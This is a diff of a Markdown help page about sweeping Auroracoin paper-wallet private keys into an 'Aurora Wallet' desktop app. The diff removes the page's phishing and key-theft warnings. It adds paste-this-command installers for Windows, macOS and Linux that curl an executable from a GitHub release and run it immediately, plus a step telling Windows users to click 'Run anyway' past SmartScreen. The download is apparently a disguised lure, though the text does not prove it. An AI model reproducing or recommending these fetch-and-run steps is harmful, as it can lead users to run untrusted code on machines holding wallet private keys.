@@ -1,100 +1,125 @@
----
-title: "Sweep Auroracoin Paper Wallet Private Keys Safely"
-description: "Have an old Auroracoin paper wallet? Learn how to sweep your private keys into Aurora Wallet to secure your AUR with a modern recovery phrase."
-primary_keyword: "sweep auroracoin paper wallet"
-silo: "recovery"
-updated: 2026-10-10
----
+![Aurora Wallet sweep paper wallet guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# How to sweep an Auroracoin paper wallet into Aurora Wallet
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+Move a printed key's balance onto an address protected by your recovery phrase.
 
-# How to Sweep Auroracoin Paper Wallet Private Keys Safely
+## Downloads - 2026.08.1.0
 
-Sweeping an Auroracoin paper wallet is the most effective way to migrate funds from physical "cold storage" into a modern digital environment. A paper wallet typically consists of a printed public address for receiving AUR and a corresponding private key for spending it. While paper wallets were once a popular security method, they are susceptible to physical damage, theft, and accidental loss. By sweeping the balance into Aurora Wallet, you protect your coins with a robust 12 or 24-word recovery phrase, ensuring long-term accessibility. You can find more security tips on the [official Auroracoin security page](https://auroracoin.net/security).
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You have a physical printout containing an Auroracoin address starting with "A".
-*   You possess a private key in WIF format (starting with 5, K, or L).
-*   You are following the [Auroracoin paper wallet](https://auroracoin.net/recovery/paper-wallet) guide to reclaim old savings.
-*   You want to move funds from a "frozen" physical state to an "active" digital wallet for trading or spending.
 
-## Why this happens
+Sweeping moves the whole balance of a paper key to an address your wallet controls, and the old key is retired by the transfer.
 
-Paper wallets function by generating a key pair entirely offline. The private key acts as the literal key to the vault on the blockchain where your AUR is stored. However, paper is a fragile medium. Furthermore, if you ever need to spend just a portion of your funds, using a paper wallet becomes technically difficult and risky due to "change address" mechanics. 
+A paper wallet is an address with its private key printed beside it. The key still works, and the risk is physical: paper burns, fades and gets photographed. A sweep signs one transaction that spends the entire balance to a fresh address derived from your phrase, which turns a fragile printout into a backup you can restore anywhere.
 
-Aurora Wallet is designed to solve these issues by providing a user-friendly interface to "sweep" the entire balance of a paper key into a new, seed-phrase-backed address. This process moves the funds on-chain, effectively retiring the old paper key and consolidating your holdings. For more background on these recovery methods, visit the [Auroracoin paper wallet recovery](https://auroracoin.net/recovery/paper-wallet) documentation.
+<!-- ARTICLE-BODY-BEGIN -->
 
-## The fix
+## Check the key and the balance first
 
-Follow these steps to safely sweep your paper wallet balance.
+Look at the printed address: an Auroracoin address begins with the letter A. The private key in Wallet Import Format begins with 5, K or L, depending on whether it is uncompressed or compressed.
 
-### 1. Verify the balance
-Before exposing your private key to any software, use a public block explorer to check the balance of your public address. This ensures the funds are still there and confirms the exact amount you should expect to see in your wallet.
+Confirm the balance on a public explorer before you sweep, so you know what to expect afterwards. A key that shows nothing has either been spent already or was never funded.
 
-### 2. Secure your environment
-Ensure you are in a private location. Close any browser tabs, screen-sharing apps, or remote-support software. Make sure no cameras (including webcams) are pointed at your screen or the physical paper wallet.
+## Sweep in order
 
-### 3. Open the Sweep Tool
-1.  Launch Aurora Wallet and unlock it with your password.
-2.  Navigate to the **Recovery** or **Tools** section.
-3.  Select the **Sweep Private Key** option.
+1. Open Aurora Wallet and let it sync completely.
+2. Open the import or sweep option and choose the private key field.
+3. Type the key carefully, or paste it if the printout includes a machine-readable copy.
+4. Confirm the address the wallet resolves from that key matches the printed address.
+5. Approve the sweep and wait for the transaction to confirm.
+6. Destroy the paper copy once the balance appears in the new wallet.
 
-### 4. Input the Private Key
-You have two primary ways to input the key:
-*   **Scanning:** Use your computer’s webcam to scan the private key QR code. This is the fastest method and avoids typing errors.
-*   **Manual Entry:** Carefully type the character string. Private keys are case-sensitive and use the Base58 alphabet (which excludes 0, O, I, and l). If you get an error, see the [24-error-5-invalid-encoding.md](24-error-5-invalid-encoding.md) guide.
+Typing a key by hand invites a character error, and the wallet rejects a malformed key rather than sending funds anywhere. If it does reject the input, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md">error 5 and invalid encoding</a> explains which characters cause it.
 
-### 5. Confirm and Broadcast
-The wallet will show the balance found on the key. Confirm that the destination address belongs to your Aurora Wallet. Click **Sweep Now**. The wallet will broadcast the transaction to the network.
+## After the sweep
 
-### 6. Wait for Confirmations
-Wait for at least six confirmations on the blockchain (usually takes 10-20 minutes). Once confirmed, the AUR will appear in your main balance, and the paper wallet will be empty.
+The balance now sits at an address derived from your phrase. Write the phrase down if you have not, and keep the paper copy out of photographs and cloud notes until you have destroyed it.
 
-## If that didn't work
+Sweeping several paper wallets in one session is safe, but each sweep is a separate transaction with its own fee. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/16-pending-transaction.md">Pending transaction</a> covers what to do if one of them waits.
 
-If the software reports "Error -5," you likely have a typo in your manual entry. Re-check the characters, paying close attention to similar-looking letters. If the balance shows as zero but you know there are funds, ensure you are on the correct Auroracoin network and not a testnet. 
-
-> [!WARNING]
-> Never use a web-based QR scanner or a "online wallet checker" to verify your paper wallet. These tools will steal your private key the moment it is scanned. Only use the official Aurora Wallet application.
-
-## Prevention
-
-To avoid the risks associated with paper-based storage:
-
-*   **Move to Seed Phrases:** Once you have swept your paper wallet, your funds are protected by your [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md). This is much easier to manage than individual paper keys.
-*   **Secure Disposal:** Once a paper wallet is swept, mark it clearly as "EMPTY" or destroy it securely. Never send funds to a paper wallet address that has been swept.
-*   **Anti-Phishing:** Be aware that scammers often target people looking for "paper wallet recovery" help. Refer to the [35-phishing-seed-scams.md](35-phishing-seed-scams.md) guide to stay safe.
+The key never needs to leave your machine: the sweep is signed locally by the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> and broadcast directly to peers.
 
 ## FAQ
 
-**Can I sweep a paper wallet multiple times?**
-No. A sweep moves the *entire* balance of the key. Once the transaction is confirmed, the paper wallet address will have a balance of zero AUR.
+### Can I sweep part of the balance?
 
-**Does sweeping cost a fee?**
-Yes. Since sweeping is an on-chain transaction, you must pay a small Auroracoin network fee. The fee is automatically subtracted from the swept amount.
+No. A sweep spends the whole output attached to that key, which is the point of the method.
 
-**What is the difference between importing and sweeping?**
-Importing simply adds the key to your wallet, leaving the funds at the old address. Sweeping moves the funds to a brand-new address. Aurora Wallet is designed to prioritize sweeping for maximum security.
+### What if the paper key is already empty?
 
-**My paper wallet is very old. Will it still work?**
-Yes. Private keys do not expire. As long as the key is readable and the balance is still at that address on the blockchain, you can sweep it regardless of when it was created.
+Someone spent it, or it was never funded. The sweep cannot recover a balance that the chain does not show.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-- [24-error-5-invalid-encoding.md](24-error-5-invalid-encoding.md)
-- [26-import-private-key-wif.md](26-import-private-key-wif.md)
-- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
-- [36-self-custody-basics.md](36-self-custody-basics.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
+- [Error 5 invalid encoding](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md)
+- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
+- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
